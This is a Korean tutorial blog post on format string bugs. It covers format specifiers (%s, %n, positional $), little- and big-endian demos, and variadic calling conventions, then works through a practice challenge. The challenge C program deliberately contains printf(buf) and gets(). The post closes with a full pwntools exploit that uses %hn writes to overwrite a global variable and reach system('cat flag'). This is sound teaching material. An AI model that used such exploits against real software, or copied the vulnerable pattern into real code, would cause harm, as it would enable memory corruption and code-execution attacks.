---
layout: post
title: "Format String Bug (FSB) - Basic"
date: 2023-02-20 02:16:00 +0900
categories: [Security, System Hacking]
tags: [pwnable, linux, FSB]
---

예전에 동아리에서 강의하던 PPT를 참고해서, 포맷 스트링 버그 취약점 관련해서 정리를 한 번 해 보았다.

나름대로 포맷 스트링 버그의 기초를 잡기에는 충분한 내용을 다뤘다고 생각하니, 이제 배우기 시작하는 사람들에게 많은 참고가 되었으면 합니당. (_ _)

그럼 바로 시작해보자!

## 0. What is Format String?
포맷 스트링 버그(Format String Bug, FSB)에 대해 알아보기 전에, 알아야 할 몇 가지 지식들이 있다.
그 중 하나가 Format String이 무엇인지에 대해 이해하는 것이다.

```c
printf("Security Factorial in %d\n", 2023);
```
위와 같이, C언어로 작성된 코드가 있다.
이때, 실제 출력되는 문자열은 `Security Factorial in %d`가 아니라, `Security Factorial in 2023`가 된다.

왜일까?
`%d`라는 기호는 사실 문자 그대로 출력하는 것이 아니라, 대체되는 의미기호이기 때문이다.
대한민국의 교육 과정을 곧잘 따라왔던 사람이라면, 이와 비슷한 것을 본 적이 있을 것이다.

```
It is sure that we will see no animals before long.
```
바로, 가주어/진주어이다.
여기서 'It'은 가주어이고, 진주어는 That 절이다.
형식 상 주어는 'It'이지만, 실제로 해석하다 보면 That 절 이하가 의미 상 주어가 된다.
That 절을 문장 맨 앞에 쓰면, 여러모로 불편한 점이 많기 때문에 뒤로 빼서 사용하는 것이다.

Format String도 마찬가지이다.
단순히 대체 기호를 쓰지 않고, 여러 문자열을 출력하는 것만으로 프로그램은 완성할 수 있다.
0점부터 100점까지 출력하는 프로그램이 있을 때, "0 Score", "1 Score", ..., "100 Score" 총 100개의 문자열을 준비해 놓고 분기를 나누면 된다.

그러나, 이는 너무나 불편한 방법이다.
대체 기호를 사용한다면, "%d Score"라는 하나의 문자열만으로 원하는 상황을 모두 구현할 수 있게 되는데 말이다.

![format string](2023-02-20-fsb/fs_example.png)

위는 Format String의 예시이다.
사람마다 정의하는 법은 다르겠으나, 나는 형식 지정자(Format Specifier, or Format Parameter)를 사용하는 문자열을 바로 Format String이라고 이야기할 것이다.

## 1. 형식 지정자
C언어에서 형식 지정자는 다양하게 존재한다.
간단한 출력인 `%c`, `%d`, `%ld`부터 16진수 출력을 담당하는 `%x`, `%lx`, `%p` 등이 그 예시이다.
그중에서 FSB를 함에 있어서 주목해야 하는 형식 지정자는 `%s`와 `%n`이다.
- `%s` : 주소를 인자로 받아, ASCII 형식으로 **그 주소의 값을 출력**한다. 
- `%n` : 주소를 인자로 받아, 이전까지 작성된 문자의 개수를 **그 주소에 입력**한다.

각각 해당 주소에 대해 읽기 권한 혹은 쓰기 권한을 필요로 하기 때문에, Segmentation Fault가 발생하기 쉬운 형식 지정자이다.

이 사실에 유의하면서 아래 예시들의 답을 추측해보자.

아래와 같은 예시 코드가 존재한다. 이때, "me too: " 이후에 출력되는 값은 무엇일까?

```c
#include <stdio.h>
int main() {
    char *str = "Hello World!";
    long long unsigned val = 0x6f6c6c6548;
    printf("Format String: %s\n", str);
    printf("me too: %s\n", &val);       // what is the result?
    return 0;
}
```

정답은 "Hello"이다.

먼저, val의 주소를 인자로 받은 뒤에, `%s` 형식 지정자를 만났기 때문에, val을 정수 값이 아니라 ASCII 문자열로 출력할 것임을 이해해야 한다.

그런 뒤에, `0x48`, `0x65`, `0x6c`, `0x6f`가 각각 'H', 'e', 'l', 'o'임을 파악한다.
그렇다면, 왜 출력 결과는 "olleH"가 아니라, "Hello"인가?

이는 Intel 계열 CPU에서 컴퓨터 메모리에 값을 저장하는 방식(Byte Order)가 Little Endian 방식이기 때문이다.

![little endian](2023-02-20-fsb/little_endian.png)

Little Endian 방식은 작은 값을 더 낮은 주소에 쓰는데, 이로 인해 `0x48`이 val 주소의 맨 처음으로 오게 되고, `0x6f`가  마지막으로 오며, 뒤에 3개의 NULL이 위치하게 되는 것이다.

이전에 언급했다시피, `%s` 형식 지정자는 주소에 있는 값을 ASCII 문자열로 출력한다.

따라서, `0x48`, 'H', `0x65`, 'e', `0x6c`, 'l', `0x6c`, 'l', `0x6f`, 'o'가 출력되는 것이다.

그러면, Big Endian을 사용하는 RISC CPU 계열에서는 "olleH"가 출력되는가에 대해 궁금한 사람이 있을 것이다.
나도 궁금하긴 한데, 그래서 직접 해 봤다.

![big endian](2023-02-20-fsb/big_endian.png)

?

아무것도 출력이 안 된다.

사실 이건 당연하다. ㅎㅎ

그럼 코드를 이제 다음과 같이 고쳐보고 다시 실행시켜보자.

```c
#include <stdio.h>
int main() {
    char *str = "Hello World!";
    long long unsigned val = 0x6f6f6f6f6c6c6548;
    printf("Format String: %s\n", str);
    printf("me too: %s\n", &val);       // what is the result?
    return 0;
}
```

![big endian](2023-02-20-fsb/big_endian2.png)

이제 뭔가 느낌이 오는가?

Big Endian을 사용하는 CPU에서는 큰 값이 가장 먼저 메모리에 작성된다. 즉, 이전에 val의 값이었던 `0x6f6c6c6548`은 사실 메모리에 이런 식으로 들어갔을 것이다.

![big endian](2023-02-20-fsb/big_endian3.png)

8바이트에서 가장 큰 값은 NULL이고, 그 다음 2바이트도 NULL인 상태이다. 문자열의 시작이 NULL이면 뭐가 출력이 된다? 아무것도 출력이 안 된다! 그래서, 맨 처음 코드로는 "me too: " 이후에 아무것도 보이지 않았던 것이다.

![big endian](2023-02-20-fsb/big_endian4.png)

두 번째 코드에서는 val에 `0x6f6f6f6f6c6c6548`의 값을 대입하였고, 그 결과로 시작 부분에 NULL이 아닌 값이 덮이게 되어, 해당 주소(`&val[0]`)부터 문자열이 출력된 것이다.

이를 직접 테스트해보고 싶다면, 도커 컨테이너를 통해 쉽게 멀티 아키텍쳐를 구현할 수 있으니, 아래 링크를 참고하길 바란다.

[https://til.simonwillison.net/docker/emulate-s390x-with-qemu](https://til.simonwillison.net/docker/emulate-s390x-with-qemu)

다음으로, `%n` 형식 지정자에 대해 알아볼 것이다. 아래와 같은 예시 코드가 존재한다. 이때, val의 값은 무엇일까?

```c
#include <stdio.h>
int main() {
    int val = 0x12345678;
    printf("%65c%n\n", 'a', &val);
    printf("val : %c\n", val);    // what is val?
    return 0;
}
```
1. 0x12345678
2. 97('a')
3. 65('A')

정답은 3번이다.
`%65c` 형식 지정자를 통해서, 64개의 공백(' ')과 문자 'a'가 출력되어 총 65개의 문자가 출력된 상태이다.
이후에 `%n` 형식 지정자로 인해, val 변수의 주소에 65가 입력되기 때문이다.

마지막으로, 인자의 인덱스를 지정해줄 수 있는 `<n>$`에 대해 알아보자.
```c
#include <stdio.h>
int main() {
    int a = 1, b = 2, c = 3;
    printf("%d %d %d\n", a, b, c);         // 1 2 3
    printf("%3$d %2$d %1$d\n", a, b, c);   // then, ...
    return 0;
}
```
첫 번째 printf 문의 출력 결과는 당연히 "1 2 3"일 것이다.
첫 번째 `%d`를 만났을 때, a 인자의 값이 출력되고, 그 다음에는 b, c 순서대로 인자를 가져와 출력하기 때문이다.
그런데, `<n>$`를 통해서, 인자의 순서를 지정해줄 수 있다.
맨 처음에는 적힌 `%3$d`는 세 번째 인자를 가져와서 출력한다는 의미이고, 그 다음(`%2$d`)에는 두 번째 인자, 그 다음(`%1$d`)에는 첫 번째 인자를 가져와 출력한다는 의미이다.

따라서, 출력 결과는 역순인 "3 2 1"이 된다.

## 2. 가변 인자
![format string](2023-02-20-fsb/printf.png)

printf 함수의 정의를 보면, 위와 같이 `...`으로 표시되어 있는 것을 확인할 수 있다.
이는 인자가 무한하게 존재할 수 있다는 소리이며, 가변 인자라고도 부른다.

어떻게 인자가 무한하게 존재할 수 있을까?

이는 함수 호출 규약을 이해하면 된다.
![calling_convention](2023-02-20-fsb/calling_convention.png)
*<64비트 멀티코어 OS 원리와 구조> 11.2.2 장 中*

x86_64 Ubuntu의 fastcall의 함수 호출 규약에서는 7번째 인자부터 레지스터가 아닌 스택에서 값을 가지고 온다.
메모리는 원한다면 계속 늘릴 수 있으니, 무한에 가깝게 인자를 가져오는 것이 가능해지는 것이다.

## 3. Format String bug
```c
printf(buf);
```
공격자가 통제할 수 있는 Format String을 필터링 없이 그대로 사용할 경우, 공격자는 임의의 레지스터 및 메모리 주소에 대해 읽기 및 출력을 수행할 수 있는 상태가 되며, 이는 상당히 치명적인 취약점임을 알 수 있다.

자, 그러면 이렇게 FSB의 원리에 대해 배워보았으니, 관련 예제를 풀어보면서 익숙해지는 것은 어떨까?
[fsb.c](https://github.com/brwook/binary/tree/main/SF_pwn)

## 4. FSB 실습 (fsb.c)

`fsb`, `fsb.c`, `fb_test` 세 개의 파일이 존재하는데, 그중에서 앞에 두 개의 파일을 다운받아서 진행하면 되겠다.

다음부터는 스포일러가 될 수 있으니, 직접 고민하고 풀어본 뒤 진행하는 걸 추천한다!

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char target[0x10] = "RAINYDAY";
int main() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	
	char buf[0x1000];
	printf("target : %p\n", target);
	while(1) {
		gets(buf);
		if(strcmp("stop", buf) == 0)
			break;
		printf(buf);
	}
	
	if(strcmp(target, "SUNNYDAY") == 0)
		system("cat flag");
	else printf("FAILED!!\n");

	return 0;
}
```
바이너리도 깃허브 레포지토리에 포함되어 있으니, 그대로 다운받아서 사용하면 되겠다.

이 문제는 초기에 "RANIYDAY"로 세팅되어 있는 target 문자 배열을 "SUNNYDAY"로 바꿀 수 있는지 묻는 문제이다.
원하는 횟수만큼 FSB를 트리거할 수 있는 상황이며, 맨 처음에 target 문자 배열을 가지고 있는 상태이다.

나는 뒤의 4바이트는 "YDAY"로 똑같다는 점에 착안하여, 처음 4바이트만 "SUNN"으로 바꾸면 되겠다는 생각으로, 다음과 같이 익스플로잇을 구성하였다.

```python
from pwn import *
p = process('./fsb')
p.recvuntil(b": ")
target = int(p.recvline(), 16)
log.success(f"target : {hex(target)}")

first = int.from_bytes(b'SU', byteorder='little')
second = int.from_bytes(b'NN', byteorder='little')
if first > second:
    second = 0x10000 - first + second

payload = b''
payload += '%{}c%10$hn'.format(first).encode()
payload += '%{}c%11$hn'.format(second).encode()
payload += b'A'*(0x20 - len(payload))
payload += p64(target)
payload += p64(target + 2)
p.sendline(payload)
p.sendline(b'stop')

p.interactive()
```
익스플로잇 코드를 설명하자면, 한 번에 4바이트 값("SUNN")을 출력하기에는 그 양이 많아서, 2바이트씩 끊어서 값을 덮어쓰고자 `%hn` 형식 지정자를 사용하였다.
또한, `first`와 `second` 변수를 두어, 각각 "SU"와 "NN"의 정수 값을 가지고 있도록 하였다.
이때 `first`(0x5553)가 `second`(0x4e4e)보다 큰 값을 가지고 있기 때문에, 먼저 출력을 수행할 경우 0x4e4e의 값은 다시는 덮을 수 없는 것이 아닌가 생각할 수 있다.
그러나, 이는 자료형의 크기로 해결할 수 있는 문제이다.

9~10번째 줄에서 `second`의 값을 `0x10000 - first + second`로 재설정하였다.
이로 인해, 두 번째 `%hn`이 실행될 때 총 작성된 문자의 개수는 `0x10000 + second`가 된다.
그러나, 우리가 사용하는 자료형의 크기는 2바이트, 즉, `0x14e4e`가 아니라 `0x4e4e`의 값이 `target + 2` 주소에 입력되게 된다.

이렇게 FSB 취약점을 익스플로잇하여, 원하는 주소에 원하는 값을 입력하는 방법을 알게 되었다.

FSB 취약점은 `printf` 함수 말고도 Format String을 사용하는 함수에선 모두 발생 가능한 취약점이니, 이에 유의하면서 포너블을 즐겨보자.

